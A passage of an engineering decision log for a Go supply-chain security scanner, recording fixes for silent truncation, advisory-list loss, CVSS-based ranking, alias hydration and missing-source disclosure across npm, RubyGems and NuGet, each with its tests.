The check moved past the `.go` filter, and `TestD142TrailingNonGoFileIsNotTruncation` pins it.

**The opposite case is disclosed, deliberately.** A subtree the walk never opened because the count was
already at the bound is *unexamined*, not *known-empty* — telling the two apart would require doing the
reading the bound exists to prevent. Unknown is disclosed rather than assumed clean, and
`TestD142UnenumeratedSubtreeIsTruncation` holds that side of the line.

**`Gap.String` dropped `Detail`, so none of these messages reached the operator.** The bound-naming text
written for each site — "go source files capped at 5000", "exports nesting capped at depth 8" — lived in
`Gap.Detail`, which the report never rendered. Every gap arrived as its bare reason word: the operator
learned that SOME bound fired, not which one, which is barely more actionable than the silence being
removed. `Gap.String` now appends `Detail` when present. This widens beyond `GapTruncated` to every reason,
which is the right blast radius: an underlying error text that was worth recording is worth showing. The
full suite was green across the change, so no consumer depended on the truncated form.

**Mutation-proven, every site and every boundary.** Removing each disclosure fails its test; the off-by-one
on each bound fails the corresponding exactly-at-cap test; counting mentions rather than distinct references
fails the duplicate-refs test; reverting `gomod` to the pre-fix loop shape fails the trailing-non-Go-file
test; deleting the top-of-walk record fails the unread-subtree test; removing the npm exports gap wiring
fails the graph-propagation test while leaving the pure-function test green — which is precisely why both
exist. `Gap.String` was mutated in both directions: dropping `Detail` and appending it unconditionally each
fail their own test.

**Wiring is proven separately from computation.** `exportsTruncation` is a pure function and
`Surface.Truncated` is a struct field; neither matters unless the adapter hands it to a sink the caller sees.
Two tests drive the real extractor end to end and read the gap off the returned error.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/installsurface`, `internal/ecosystem/npm`, `internal/ecosystem/gomod`, `internal/ecosystem/instsurf`.
Live CLI on three purpose-built trees, one per site: a 40-sibling npm entry, a 5,010-file Go module, and a
600-entry exports map. Each reports `install_surface_gaps: 1`, a `scan-bound-truncated` reason, a stderr
warning, the "This report is NOT an all-clear" line, and — after the `Gap.String` fix — a detail line naming
the specific bound.

Residual limitations: the bounds themselves are unchanged, so this makes truncation visible rather than
rarer; a tree crafted to sit just past `maxGoFiles` still hides its tail, it just no longer hides that it is
hiding. The root-module `gomod` call site passes an empty package ID, so its gap reads as a bare path — the
project directory is already on the report line, but the gap itself is less self-describing than the
per-dependency ones. The sweep covered bounds reachable from install-surface extraction; resolver-side and
datasource-side caps were not audited, and no claim is made about them here.

## D-143 — the resolver-side and datasource-side cap audit D-142 deferred

**Trigger:** D-142 closed with an explicit exclusion — "the sweep covered bounds reachable from
install-surface extraction; resolver-side and datasource-side caps were not audited, and no claim is made
about them here." This is that audit. Two real defects, one of them the same shape as the `maxGoFiles` lie
D-142 found, and five bounds that turned out to be correct and are recorded here so the next audit does not
re-derive them.

**What is NOT broken, verified rather than assumed.** `osv.maxBatch` (1000) and `epss.maxBatch` (100) look
like truncation and are not: both are chunking loops that iterate until every coordinate is covered, and
EPSS counts a failed chunk into `Stats.Gaps`. `datasource.maxSnapshotBytes` (64 MiB) rejects an oversize
file outright with an error rather than reading part of it. The response caps in `depsdev` (16 MiB),
`npmreg` (100 MiB) and `registry` (50 MiB) are applied to JSON documents, where a truncated read cannot
parse — `depsdev` turns exactly that into `Stats.Gaps++` plus an error. Five bounds, five honest behaviours.

### Defect 1 — the Go proxy truncated line-oriented text in silence

`goproxy.get` read with a bare `io.ReadAll(io.LimitReader(body, maxResponseSize))`. Both of its consumers
parse line-oriented text, not JSON: `Versions` splits `@v/list` on newlines, and `ModFile` hands go.mod
source to `scanGoMod`. A truncated read therefore does not fail to parse the way a cut-off JSON document
does — it simply yields less.

Reproduced before anything was changed. An 8 MiB+ version list came back with `err == nil` and 708,310 of
708,652 versions. The 342 missing entries are the smaller half of the problem; the last entry returned was
`"v1.708309."` — the cut landed mid-token, so a fragment of a version string that was **never published**
entered the candidate list the presume walk chooses from. Truncation was not merely losing data, it was
manufacturing it.

The read now takes one byte past the cap so an oversize body is *detectable*, and an oversize body is a gap
rather than a partial answer. The `+1` is what makes the exactly-at-cap case decidable, and
`TestD143ExactlyAtCapIsNotOversize` holds that line: a body of exactly `maxResponseSize` was received in
full, and rejecting it would turn a complete answer into a gap.

### Defect 2 — the expansion depth bound, and a decision resting on a premise that had stopped holding

A 20-deep chain walked with the default options reaches depth 9, leaves eleven packages unentered, and
reports `Complete=true`, `Degraded=false`, `Incomplete()=false`. A clean all-clear over what was never read.

The disclosure existed and dead-ended. The leftovers are marked `AttrFrontier` — an attribute **no non-test
code in the repository consults** — and counted into `Result.Frontier`, which the CLI never folds into
anything. `expandTransitive`'s own doc comment claimed it folded "every root's frontier and unread counts";
it folds `Unread` alone. That is the `maxGoFiles` shape again: a comment asserting a disclosure the code does
not perform, which is worse than no comment, because an auditor checks the comment and moves on.

**The user-facing half is worse than the comment.** `-expand-depth`'s help string read
`0 = full depth`. Zero is the default, and zero selects `defaultMaxDepth = 8`. The flag's own
documentation told operators the default was unlimited when the default was eight.

**Why this changes a decision rather than just fixing a bug.** D-24 deliberately exempted this bound from
degrading coverage, and stated its reason: the frontier has three causes kept apart, and of them "the
`-expand-depth` cap (a limit the operator chose)" does not degrade, only an unread coordinate does. That
reasoning is correct wherever its premise holds. It does not hold for a default nobody selected, which is
every scan that never passes the flag. So the exemption is kept exactly where D-24 earned it — an explicit
`-expand-depth=2` is someone stepping the tree on purpose, and failing their build for it is the warning tax
that gets a tool muted — and dropped where the premise fails.

The result: `Result.DepthTruncated` counts what was still queued when the bound stopped the walk, kept
**separate** from `Frontier` because that number adds three unlike things together and no caller can report
a bound honestly from a total. Disclosure is unconditional; degrading is conditional on the cap not being
the operator's. The two coverage notes are joined rather than assigned, because a deep tree walked offline
trips both and assigning would drop one in exactly the case where coverage is weakest.

**A boundary that had to be discovered rather than assumed.** The first version of
`TestD143ExactlyExhaustedIsNotTruncation` asserted that a 3-link chain at `MaxDepth=3` is untruncated. It
fails, and the code is right: placing a node is not reading it. Three layers put `c1..c3` in the graph and a
fourth reads `c3`'s own declarations, so at `MaxDepth=3` the walk genuinely stops with `c3` unexamined. The
test now pins both sides of that edge.

**Mutation-proven.** Reverting the goproxy read to the bare `LimitReader` fails both oversize tests;
tightening its comparison to `>=` fails the exactly-at-cap test. Dropping `res.DepthTruncated++` fails the
engine and CLI disclosure tests; setting it from the bound's *existence* rather than from work left queued
fails both false-positive tests; removing the coverage fold fails the degrade test; degrading regardless of
who chose the bound fails the operator-chosen test; assigning notes instead of joining fails the composition
test.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/expand`, `internal/datasource/goproxy`, `cmd/depsnort`. Live CLI: an ordinary PyPI project draws no
depth warning (the walk ran out of tree first); `-expand-depth=1` prints the warning with 11 packages still
queued and leaves `expand`'s gap count at the unread value, with no depth-bound note — the operator-chosen
exemption behaving as designed.

**How reachable the default bound actually is, measured rather than asserted.** A 184-package
`jupyter` + `apache-airflow` tree reaches depth **6** — real PyPI trees are wide, not deep, and the default
bound of 8 was not hit even there. That tempers the severity honestly: on PyPI this fires rarely. It does
not excuse it. npm trees nest deeper, an adversarially-authored chain is deeper still by construction, and
when the bound does bite the report is wrong in the one direction a security tool must never be wrong in.
The live default-bound-degrades path is therefore proven by test, not by a live scan; no real tree available
here reaches it.

Residual limitations: `defaultMaxDepth` is unchanged at 8, so this makes the truncation visible rather than
rarer — raising it is a network-cost decision, and an unbounded walk is not safe, since a hostile registry
can serve an endless chain of distinct names that the per-node `expanded` guard does not terminate.
`AttrFrontier` is still written and still read by nothing; `DepthTruncated` routes around it rather than
fixing it, and the other two frontier causes remain fused in `Result.Frontier`. The audit covered
`internal/expand` and `internal/datasource`; the check layer and the emitters were not swept.

## D-144 — the check-layer and emitter cap sweep

**Trigger:** D-143 closed by excluding these two layers explicitly. This is that sweep, and it completes the
arc D-142 started: every bound in the tool has now been looked at, in extraction, in resolution, in the
data sources, and here in the checks and the emitters.

**The class of bound is different here, and that changes what "honest" means.** In D-142 and D-143 a bound
meant *we did not look*. In this layer the tool looked at everything and caps only what it *prints*. A
display cap is legitimate — the alternative is the 1,284-entry, 224-page report the PDF's own comment
records as the reason `maxAdvisoryShown` exists. Such a cap is dishonest only when the count is lost, the
truncation is unsignposted, or **the cut systematically drops the items that matter most**. That third test
is the one worth applying carefully, and it is the one that found the defect.

**Six of the seven bounds are honest, and the claims attached to them were verified rather than believed.**
Three separate comments assert some form of "the complete list is in the JSON" — precisely the shape of the
`maxGoFiles` comment D-142 caught lying — so each was checked against the code:
`verdict.Result.Findings` carries no cap, so the PDF's advisory-cap disclosure is true; `RootCoverage.Names`
is the whole split of the attribute, so `maxCoverageNameChars` truncates only the PDF's copy, and
`truncateRunes` appends an ellipsis rather than cutting silently; `Finding.ReachableRoots` is a real emitted
field, so `maxListedReachableRoots` caps prose alone. `maxUnverifiableDetails` and `maxGapDetails` both keep
an uncapped count beside a bounded sample. Every one of these claims held.

### The defect: VC-008's advisory ids stopped existing past the cap

VC-008 aggregates a package's advisories into ONE finding (D-14, and the axios regression that produced 25
findings for one package). The evidence prose lists at most `maxListedAdvisories` = 8 ids and appends
"+N more". The count in the title is honest and the truncation is signposted — and the ids past the cap were
carried in no output format whatsoever. Not JSON, not SARIF, not the PDF. The report told an operator that
three further advisories applied to this package and gave them no way, in any format, to learn which three.

**The selection rule made it materially worse, in a security-relevant direction.** The listed ids were the
first 8 of `sort.Strings(ids)`. CVE identifiers sort chronologically, so the sample was the eight OLDEST
advisories and the ones hidden were systematically the NEWEST — and because "CVE-" sorts before "GHSA-", a
package with eight or more CVEs hid every GHSA it had. Reproduced before any change: of eleven advisories,
the prose showed CVE-2015 through CVE-2018 and hid CVE-2025, CVE-2026 and the GHSA behind "+3 more".

**The fix is the one this codebase already reaches for: make the cap cosmetic rather than lossy.**
`Finding.Advisories` carries the complete sorted set, so the prose bound decides presentation and never
retention. The same reasoning that put `ReachableRoots` and `EPSS` on the finding as structured data rather
than prose applies here, and this is the field that was missing from that set.

**Ordering: the principle was already stated in this file, one level up.** VC-008 already ranks FINDINGS by
peak EPSS so that "the vulnerabilities most likely to be exploited in the wild surface first" — its own
words. The ids INSIDE a finding were ordered alphabetically. `rankAdvisoryIDs` applies the existing signal
at the existing granularity: descending exploit probability when EPSS is present, sorted order as the
deterministic fallback, because an advisory record carries no severity field and inventing a proxy for one
would be a conclusion the data does not support. Sorted order is also the tie-break, which is what keeps the
evidence string diffable in a CI gate (D-09).

**SARIF needed the same field, and finding that out required correcting a wrong reading.** An initial check
appeared to show SARIF already carrying the capped ids. It did not — the flag had landed after the
positional argument, so Go's `flag` package stopped parsing and the file was JSON. Read correctly, SARIF's
property bag mapped six fields and `advisories` was not among them. SARIF is the format CI actually ingests,
so a list recoverable only from `-format json` is not recoverable where it matters most; the property is now
mapped there too.

**Mutation-proven, and two of my own tests were vacuous until the mutations said so.**
`TestD144AdvisoriesAreSortedAndComplete` passed against a mutation that populated NOTHING, because a
sortedness loop over an empty slice is trivially true — the test asserted completeness in its name only. And
nothing covered the tie-break contract: turning the comparator into the non-strict `>=` left every test
green. Both were fixed, and both now fail against exactly those mutations. Beyond them: dropping the field
fails the survival tests; populating it from the capped sample instead of the full set fails; reverting the
ranking fails the EPSS ordering test; ignoring scores entirely fails; removing the malicious filter fails the
guard that keeps MAL- advisories with VC-001; deleting the SARIF property fails the SARIF test.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/check/builtin`, `internal/emit`, `internal/verdict`. Live CLI end to end via `-osv-snapshot` (OSV
itself is unreachable from this environment): a package with eleven advisories reports "11 known
vulnerabilities", prose "+3 more", and both JSON and SARIF carrying all eleven ids, with CVE-2025-9001,
CVE-2026-9002 and the GHSA recoverable only through the new field.

Residual limitations: the PDF still shows a bounded sample and still points readers to the JSON for the
rest, which is now true for advisory ids as well as findings but still means the printed document is not
self-sufficient. `maxUnverifiableDetails` prints ten examples after a sentence that states the true count,
so the shortfall is inferable rather than marked — weaker than the explicit "+N more" used elsewhere, and
left alone rather than widened here. `rankAdvisoryIDs` improves WHICH ids the prose keeps only when `-epss`
is on; without it the sample is still the alphabetically-first, which for CVE ids is still the oldest — the
loss is no longer permanent, but the default sample is still not the most interesting one. And ordering by
exploit probability is not ordering by severity: EPSS predicts exploitation, not impact, and no severity
field exists in an advisory record to sort by.

## D-145 — ranking the advisory sample without EPSS

**Trigger:** D-144 made VC-008's advisory list complete but ranked the prose SAMPLE only when `-epss` was
on, and closed with that as a stated residual: "without it the sample is still the alphabetically-first,
which for CVE ids is still the oldest." This closes it.

**What the old fallback actually did.** With no scores, `rankAdvisoryIDs` returned early and ids fell in
sorted order. Sorted order is not neutral. CVE identifiers embed the year, so lexicographic order is
chronological order, and the eight ids an operator actually read were reliably the OLDEST advisories the
package had. Because `CVE-` sorts before `GHSA-`, a package with eight or more CVEs also showed no GHSA at
all — the sample was biased by identifier namespace, which says nothing about anything.

**The first question was whether severity was available, and the answer is no — for a real reason.** OSV's
`/v1/querybatch` returns only `{id, modified}` per vulnerability; severity, aliases and details require a
separate `/v1/vulns/{id}` call per advisory. `qbVuln` decodes exactly the two fields the endpoint returns,
so there is nothing being dropped there. The bundled dataset does carry a `severity`, but every one of its
1,612 records is a `MAL-` malicious-package advisory, which VC-008 excludes by construction (that is
VC-001's). So severity ranking would cost one request per advisory and is not what this entry builds.

**What IS available and was being discarded: `Modified`.** The live OSV path parses it and populates
`Advisory.Modified`, and nothing read it. An advisory record cannot tell us how bad a vulnerability is, but
it can tell us when it last changed, and the ranking was throwing that away while falling back to a rule
that was actively anti-correlated with interest.

Two signals now, in order of how directly they speak to risk. Exploit probability first, unchanged — a
measured prediction that a vulnerability is being exploited beats any proxy, and `TestD145EPSSStillOutranks
Recency` pins that an exploited 2015 CVE still leads a quiet 2026 one. Recency second. Sorted order remains
the final tie-break, which is what keeps the evidence string diffable in a CI gate (D-09).

**The fallback for records with no timestamp is deliberately weaker than the real signal.** Snapshot and
bundled records carry no `Modified`, so the year embedded in a CVE identifier stands in — but it is a
DISCLOSURE year, not an update date, and the two are not interchangeable. `advisoryWhen` therefore consults
it second and never lets it overwrite a real timestamp: an old CVE the registry revised last month outranks
a newer one nobody has touched. `TestD145RealTimestampBeatsTheYearGuess` is the test that would fail if the
precedence were reversed, and it does fail against exactly that mutation.

**An identifier is attacker-influenced data.** `cveYear` range-guards the parse, because `CVE-9999-1` would
otherwise yield a year that sorts above every genuine advisory — a package could put whatever it liked at
the top of the sample by naming an advisory carefully. Without the guard,
`TestD145MalformedYearsDoNotRankFirst` fails on both `CVE-9999-1` and `CVE-99999999-1`.

**Three D-144 tests asserted the behaviour this entry replaces, and were corrected rather than deleted.**
`TestD144WithoutEPSSOrderStaysDeterministic` required sorted order — precisely the rule being removed — so
its determinism half is kept and its ordering half now expects the most recent first, with the reversal
noted inline. `TestD144EqualScoresKeepSortedOrder` was about the TIE-BREAK, and D-145 inserted recency
between EPSS and the tie-break, so the fixture now flattens both signals to keep the test about what it was
always about. `TestD144EveryAdvisoryIDSurvivesTheProseCap` named specific ids in its precondition; it now
asks the question generically — whatever the prose dropped must still be recoverable — which is the durable
form and does not need revisiting the next time the ranking changes.

**Mutation-proven.** Removing recency from the comparator fails three tests; restoring the pre-D-145
no-EPSS short circuit fails two; letting the year guess override `Modified` fails the precedence test;
dropping the range guard fails the malformed-id test; promoting recency above EPSS fails the EPSS-primacy
test; making either comparator tier non-strict fails the D-144 tie-break guard, which confirms that guard
still holds under the expanded comparator. One mutation — replacing the final `return false` with
`return out[i] < out[j]` — changed nothing, and it is an equivalent mutant rather than a test gap: on
already-sorted input the two produce identical output.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/check/builtin`, `internal/emit`, `internal/verdict`. Live CLI on the same eleven-advisory snapshot
D-144 used: the prose led with `CVE-2015-1000 … CVE-2018-1007, +3 more` before, and now leads
`CVE-2026-9002, CVE-2025-9001, …` — the newest first, through the CVE-year fallback, since snapshot records
carry no timestamp.

Residual limitations: a GHSA with neither a timestamp nor a CVE alias still has no date signal at all and
falls to the sorted tie-break — visible in the live run above, where the GHSA remains among the three
dropped. It is no longer segregated BY PREFIX, and on the live OSV path it carries a `Modified` and ranks
like anything else, but on snapshot and bundled data it sinks. Closing that would mean populating `Aliases`,
which the batch endpoint does not return. Recency is a proxy and not a good one in the abstract: an old
unfixed CVE can matter more than a newly-touched record, and nothing here claims otherwise — only that a
recency-ranked sample beats one ordered by how the identifier happens to spell. Severity ranking remains
unbuilt and would cost one request per advisory.

## D-146 — CVE-alias hydration, and a correction to D-145's account of why it was missing

**Trigger:** D-145 closed with a residual: a GHSA carrying neither a timestamp nor a CVE alias has no date
signal, and "closing that would mean populating `Aliases`, which the batch endpoint does not return."

**That residual named the wrong blocker, and the correction matters more than the fix.** The claim about
querybatch is true — it returns `{id, modified}` and no aliases. But a hydration path for exactly this
already existed in the tree: `osv.CVEAliases` resolves aliases through the fuller `/v1/query` endpoint, one
cached call per COORDINATE (not per advisory), and had been there since the EPSS work. D-145 reasoned from
the batch endpoint's shape to "there is no way to get aliases" without checking whether the repository
already had one. It did. The blocker was never the API; it was that hydration ran only inside
`if *epssOn && !*offline && osvClient != nil`, and `-epss` defaults to false — so on a default scan
`Advisory.Aliases` was empty, always, and line 1499 of main.go was the only place in the program that ever
set it.

**Reproduced before changing anything, and the reproduction moved the target.** A snapshot that SUPPLIES
aliases already ranks correctly today: a GHSA whose alias is `CVE-2026-9002` sorts first, because
`advisoryWhen` reads the year off the alias exactly as designed. So the D-145 mechanism was sound and
untested only because nothing fed it. What the same run also showed is the sharper problem: the finding
listed `GHSA-aaaa-bbbb-cccc` and not `CVE-2026-9002`. The tool had resolved the GHSA to a CVE, used that CVE
to decide what an operator would read, and then never told them. Someone searching the report for a CVE they
had been briefed on found nothing.

**What recency actually gains from hydration is close to nothing, and saying so is part of the job.** OSV's
schema makes `modified` required and querybatch returns it, so a live advisory already has a real timestamp
and ranks fine without any alias. Where a timestamp is absent — imported snapshots, the bundled dataset —
the scan is offline and `CVEAliases` is cache-only, so hydration cannot help there either. Anyone reading
D-145's residual would expect this entry to fix ranking. It mostly does not. What it fixes is IDENTITY.

**Hydration now runs on its own,** gated on OSV being available and the scan being online rather than on
`-epss`. EPSS continues to consume the same hydrated map, so nothing is fetched twice, and whether alias
resolution degraded still reaches the EPSS coverage note — that fact travels with the enrichment even though
the fetch moved out of it.

**Decoupling it means every online scan can now spend requests here, so the candidate set is targeted.**
`aliasCandidates` asks only about coordinates carrying a non-malicious advisory whose id is NOT already a
CVE: a package whose advisories are all CVE-primary carries its CVE identity in the id, and querying it
would spend a request to learn nothing. Malicious-only packages are VC-001's and never reach VC-008;
unversioned nodes cannot be queried at all, since `/v1/query` is keyed by name and version. Each coordinate
appears once however many non-CVE advisories it has. On a scan with no vulnerabilities the added cost is
zero requests.

**`Finding.Aliases` is separate from `Finding.Advisories` deliberately.** Folding aliases into the advisory
list would have been the obvious shortcut and would have broken D-144's contract: `Advisories` means "the
advisories this finding aggregates" and matches the count in the title, so two GHSAs with two CVE aliases
must stay "2 known vulnerabilities" rather than becoming four. An alias is another NAME for a vulnerability,
not another vulnerability. `TestD146AliasesDoNotInflateTheCount` fails against exactly that shortcut. A CVE
that OSV returns both in its own right and as another advisory's alias is listed once, as an advisory.

**Mutation-proven, eight sites.** Not populating aliases fails the identity tests; folding them into the ids
fails the count test; dropping the primary-id dedup fails the double-listing test; dropping the sort fails
the determinism test; widening `aliasCandidates` to every vulnerable coordinate, or to malicious-only
packages, or to unversioned nodes, each fails its own targeting test; removing the SARIF property fails the
SARIF test.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/check/builtin`, `internal/emit`, `cmd/depsnort`. Live CLI on a snapshot carrying a GHSA aliased to
a recent CVE: JSON now emits `advisory_aliases: ["CVE-2026-9002"]` beside the nine advisory ids, SARIF emits
`advisoryAliases`, and the title still reads nine. An offline run prints no alias line at all, confirming
the gate.

Residual limitations: hydration needs the network, so an offline or `-no-osv` scan still has whatever
aliases its input carried and no more — which is the honest floor, not a gap that can be closed from a
cache. The live-OSV recency case that D-145's residual pointed at was already working and remains so; this
entry did not improve it, and the residual as written overstated what hydration would buy. `/v1/query`
returns full advisory records including severity, which this still discards — a severity-ranked sample is
now a strictly smaller change than D-145 assumed, since the request is already being made for the
coordinates that matter, and that is worth revisiting on its own rather than smuggling in here. Aliases
other than CVEs (PYSEC, GO, OSV cross-references) are still dropped by `mergeAliases`, which predates this
entry and is unchanged.

## D-147 — severity ranking, and a CVSS scorer verified against published vectors

**Trigger:** D-145 recorded severity as unavailable and ranked on recency instead. D-146 corrected half of
that — `/v1/query` returns severity, and D-146 was already calling it for the coordinates that mattered —
and left the ranking itself as a stated residual. This is that work.

**The obstacle was never access, it was that OSV publishes severity as a VECTOR.** `severity[].score` is a
CVSS vector string (`CVSS:3.1/AV:N/AC:L/…`), not a number, so a tool that wants to rank by severity has to
score it. The v3.1 base-score formula is published, closed-form and deterministic — no lookup tables, no
judgement — which is what makes implementing it here safe rather than a dependency (D-10).

**It is verified against an oracle, not against itself.** `TestBaseScoreMatchesPublishedVectors` checks ten
vectors whose base scores FIRST publishes. That distinction did real work: mutating the Roundup function to
plain rounding, dropping the Scope-Changed 1.08 multiplier, or shifting the exploitability constant from
8.22 to 8.0 each still produces confident-looking numbers, and each is caught only by disagreement with a
published figure.

**v2 and v4 vectors are refused rather than approximated.** v2 uses a different formula; v4 replaces the
closed form with a much larger table-driven algorithm. Guessing at either would emit numbers that look
authoritative and are not, so both return unscored and fall through to the qualitative label — which is
exactly the case `GHSA-label-only` covers in the hydration test.

**Ranking is by TIER first, then exact score.** A label-only CRITICAL and a scored 7.0 HIGH cannot be
compared as numbers — one has no number at all — so the ordering runs on CVSS's own published bands
(0.1-3.9 low, 4.0-6.9 medium, 7.0-8.9 high, 9.0-10.0 critical), which both sources can be mapped onto
without inventing a value. An exact score refines the order only WITHIN a band, where it is genuinely
known on both sides. The full chain is now: exploit probability (D-145's reasoning stands — a measured
prediction of exploitation beats any proxy), then severity, then recency, then sorted order as the
tie-break.

**A scored 0.0 is a rating, not an absence.** A vector describing no impact ranks below every rated
advisory and ABOVE an unrated one, because "we know this is harmless" carries more information than "we
know nothing". That is why `Advisory` carries `ScoredSeverity` beside `Severity` rather than treating zero
as unknown.

**The candidate rule from D-146 had to widen, and its test was corrected rather than worked around.** D-146
queried only packages holding a non-CVE advisory id, because the only thing being fetched was a CVE identity
and a CVE-primary advisory already carries its own. Severity is returned for NO advisory by querybatch, so
that restriction no longer holds: a package whose advisories are all CVEs still has no severity until asked.
`TestD146OnlyNonCVEAdvisoriesAreWorthQuerying` asserted the narrower rule and is now
`TestD146EveryVulnerablePackageIsQueried`, with the reversal noted inline. What still bounds the cost is
unchanged and is the part that always mattered: no advisories, no request.

**A field name collided with the on-disk snapshot format, and the existing tests caught it.** Naming the
numeric score `severity` in JSON stopped the bundled dataset from parsing, because that format already uses
`severity` for a qualitative STRING. The score is now `cvss_base_score` and the label keeps `severity` —
which is both backward-compatible and the more honest naming, since "severity" alone does not say on what
scale. A side effect worth noting: the bundled dataset's own `"severity": "critical"` now populates
`SeverityLabel` rather than being discarded.

**Two of my own tests were passing for the wrong reason.** `TestBaseScoreMatchesPublishedVectors` could not
distinguish the two Privileges-Required weight tables, because its only Scope-Changed vector used `PR:N`,
which weighs 0.85 in both — two Scope-Changed vectors with `PR:L` and `PR:H` fix it. And
`TestD147ScoredZeroIsRatedNotUnknown` passed against a mutation treating a scored 0.0 as unknown purely
because the expected advisory happened to sort first alphabetically; the ids are renamed so the sorted
tie-break points the OTHER way and only the tier can produce the expected order.

**Mutation-proven, twelve sites** across the formula, the hydration parse and the comparator: rounding,
scope multiplier, PR table, exploitability constant and version guard in the scorer; first-vector-instead-of-max
and dropped label in the parse; tier removed, severity promoted above EPSS, raw score instead of tier,
scored-zero-as-unknown and recency removed in the ranking.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/datasource/osv`, `internal/check/builtin`, `internal/emit`, `cmd/depsnort`. Live CLI on a snapshot
of eight recent-but-unrated advisories, one 2015 CVE scored 9.8, and one label-only HIGH: the prose leads
`CVE-2015-1000, GHSA-oldhigh, CVE-2026-8001, …` — severity over recency, and the label-only HIGH placed
above unrated advisories a decade newer. `advisory_severity` carries `{cvss_base_score: 9.8, cvss_scored:
true, label: CRITICAL, advisory: CVE-2015-1000}`, and SARIF gains `cvssBaseScore` and `advisorySeverity`.

Residual limitations: severity needs the network, like the hydration it rides on, so an offline or `-no-osv`
scan ranks on whatever its input carried — a snapshot may supply severity, and the bundled dataset now does
for its own records, but neither is fetched. Only CVSS v3 vectors are scored; a v4-only advisory is ranked
by its label, and one with a v4 vector and no label is unrated entirely, which will matter more as v4
adoption grows. The base score ignores temporal and environmental metrics, which is correct for ranking a
published advisory but means the number is not tailored to this deployment. And severity orders the prose
sample only — it does not change gate class, since VC-008 stays advisory-class by default (D-14) and a
CRITICAL CVSS score is still not a reason to fail a build by default.

## D-148 — the npm/gem/nuget offline-and-source-availability audit

**Trigger:** D-141 answered "what does this ecosystem do when a dependency's source is not available?" for
PyPI and closed by declining to generalize: "the npm/gem/nuget equivalents of this question remain
unaudited." This is that audit. Verdicts: nuget honest with one edge defect, npm silently skipping, and
rubygems the worst of the three — dependencies never examined and never disclosed.

**The baseline the three are measured against** is the posture cargo (D-140), pypi (D-141) and the gap layer
(R-01) already share: examine a dependency's source where it is locally present, and record
`source-unavailable` where it is not. None of these three ecosystems fetches anything, and this entry adds
no fetching — the question is purely what happens at the local miss.

### nuget: honest, with one edge defect

A dependency missing from the cache records `GapUnavailable` — but only when the cache-dir list was
non-empty. With no `NUGET_PACKAGES` and no resolvable home directory, the guard `len(pkgDirs) > 0` made
every miss silent: the environment where NOTHING could be examined reported as the cleanest. The guard is
removed; fewer places to look is less coverage, not less to say.

### npm: the silent skip, defended by a comment and two tests

A dependency directory absent from a pre-install tree was skipped with nothing recorded — `Classify` treats
`ErrNotExist` as "ordinary absence", and the extractor's doc comment asserted "the gap is not papered over"
while nothing was recorded anywhere. Reproduced: a lockfile whose dependency carries
`hasInstallScript: true`, no `node_modules` — zero gaps, and the coverage line implied the install surface
had been read.

The defense has real content and gets a real answer. `hasInstallScript` (VC-002a) does still stand — but it
is the registry's ASSERTION of hook presence, not an observation of hook CONTENT: the cradle and exfil
markers VC-002e/f read, and the entry module's load-time chain (D-134), were never examined. The absent
dependency's source is not an "optional file" in R-01's sense — a package without a Rakefile has no
Rakefile; a dependency without its source merely hasn't been looked at. Absent source for a dependency node
is now `GapUnavailable`; the root stays exempt (its manifest is what discovery keyed on); refusals keep
their typed reasons.

**Three shipped tests asserted the skip, and one was the E2E control for it.**
`TestExtractInstallSurfaceNoNodeModulesIsQuiet` and `TestAbsentPackageDirIsNotAGap` encoded it at the
adapter seam; `TestE2E_AbsentPackageStaysCleanAndComplete` pinned it at the CLI under `-fail-on-incomplete`,
reasoning "if absence gated, every real pre-install scan would fail and the signal would be worthless".
That reasoning conflates disclosure with gating: the gate fires only under the OPT-IN flag, and an operator
who chose `-fail-on-incomplete` is asking precisely "did you read everything?" — for a pre-install tree the
honest answer is no. It also could not survive the tool's own inconsistency: cargo, nuget and pypi all
disclose this exact condition, and npm alone reported the least-examined tree as the most complete. All
three tests corrected with the reversal inline; the halves that remain true (no invented hooks; no gate
without opt-in) are kept as their own assertions.

### rubygems: dependencies never examined, never disclosed — and a bug under that

The adapter's scope was "the root gem only", on the stated grounds that "transitive gems are fetched from
rubygems.org and are not present in a source checkout". That premise is false for the two standard local
installs — Bundler's `vendor/bundle` (committed or CI-cached in exactly the projects that scan) and
`$GEM_HOME` — and the consequence was severe: the classic rubygems supply-chain payload IS a dependency's
extconf.rb, and a Gemfile.lock full of native-extension gems scanned with zero gaps, as if every extconf.rb
had been read and found clean.

Dependency gems are now scanned at cargo parity: `findGemDir` searches `vendor/bundle/ruby/*/gems` and
`$GEM_HOME/gems` (local-only, nothing fetched, D-04), a found gem's extconf.rb/gemspec/Rakefile go through
the same `AnalyzeRuby` as the root with hooks attributed to the dependency node, and a gem in neither place
records `GapUnavailable`. Lookup keys come from a parsed Gemfile.lock — attacker-authored input — so a name
or version containing separators or traversal is refused as `GapContainment` before any path join, the same
discipline as nuget's `isCleanPkgName`.

**Writing the tests exposed a pre-existing bug that had made the root-only scope even narrower than
documented.** `ExtractInstallSurface` returned early when the ROOT had no extconf/gemspec/Rakefile — the
shape of nearly every *application* (a Gemfile.lock and no gemspec of its own). Harmless in the root-only
era; with dependency scanning it would have skipped every dependency for exactly the most common project
shape. The early return is removed.

**Proven end to end:** a hostile extconf.rb planted in a vendored dependency produces a VC-002f
download-cradle finding attributed to `pkg:gem/sassc@2.4.0` — a detection that did not exist at all before
this entry — while the gems not vendored disclose as `source-unavailable x2` in the same run.

**Mutation-proven, eight sites:** npm's silent skip restored and its root exemption dropped; gem's
dependency scan removed, its miss undisclosed, its early return restored, its key sanitizer removed, and its
`$GEM_HOME` search dropped; nuget's empty-list guard restored. Each fails its test.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on the
four touched packages. Live CLI: the npm cold tree that reported 0 gaps now reports `source-unavailable x1`;
the gem cold tree that reported 0 now reports `x3`; the vendored-hostile-gem tree reports the VC-002f
finding plus `x2` for the unvendored rest.

**A behaviour change the owner should weigh at review:** a pre-install npm scan — a common CI shape — now
reports incomplete install-surface coverage and, under `-fail-on-incomplete` only, exits 3 where it exited
0. This is the same visible-honesty cost D-141 accepted for offline PyPI, applied to the last ecosystem that
lacked it.

